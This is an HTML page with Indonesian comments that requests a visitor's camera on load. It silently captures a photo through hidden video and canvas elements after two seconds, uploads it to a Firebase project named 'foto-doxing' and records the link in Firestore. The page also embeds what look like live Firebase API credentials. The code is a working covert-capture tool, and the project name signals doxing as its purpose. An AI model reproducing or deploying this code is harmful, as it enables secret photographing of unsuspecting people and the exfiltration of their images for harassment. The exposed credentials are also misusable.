<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Upload Foto ke Firebase</title>
</head>
<body>
  <h2>ğŸ“¸ Foto otomatis lalu tersimpan ke Firebase</h2>
  <canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
  <div id="status">Menunggu kamera...</div>

  <!-- Firebase SDK (pakai CDN versi modular) -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

    // ğŸ”¹ Config Firebase kamu
    const firebaseConfig = {
      apiKey: "AIzaSyCI0i2fIl-B7wMPvhyxxZdfPLKEe-nOlVQ",
      authDomain: "foto-doxing.firebaseapp.com",
      projectId: "foto-doxing",
      storageBucket: "foto-doxing.firebasestorage.app",
      messagingSenderId: "839479538330",
      appId: "1:839479538330:web:9e5bef4e323cf96b3e2523",
      measurementId: "G-9X78MHZW9W"
    };

    // ğŸ”¹ Inisialisasi Firebase
    const app = initializeApp(firebaseConfig);
    const storage = getStorage(app);
    const db = getFirestore(app);

    // ğŸ”¹ Ambil kamera user
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement("video");
        video.style.display = "none";
        document.body.appendChild(video);
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
          setTimeout(() => {
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas ke Blob (file gambar)
            canvas.toBlob(async (blob) => {
              try {
                const fileName = "foto_" + Date.now() + ".png";
                const storageRef = ref(storage, "uploads/" + fileName);

                // Upload ke Firebase Storage
                await uploadBytes(storageRef, blob);
                const downloadURL = await getDownloadURL(storageRef);

                // Simpan link ke Firestore
                await addDoc(collection(db, "foto_users"), {
                  url: downloadURL,
                  timestamp: serverTimestamp()
                });

                document.getElementById("status").innerText = "âœ… Foto berhasil diupload!";
              } catch (error) {
                document.getElementById("status").innerText = "âŒ Gagal upload: " + error;
              }
            }, "image/png");

            // Stop kamera
            stream.getTracks().forEach(track => track.stop());
          }, 2000); // foto diambil setelah 2 detik
        };
      })
      .catch(err => {
        document.getElementById("status").innerText = "âŒ Kamera diblokir: " + err;
      });
  </script>
</body>
</html>
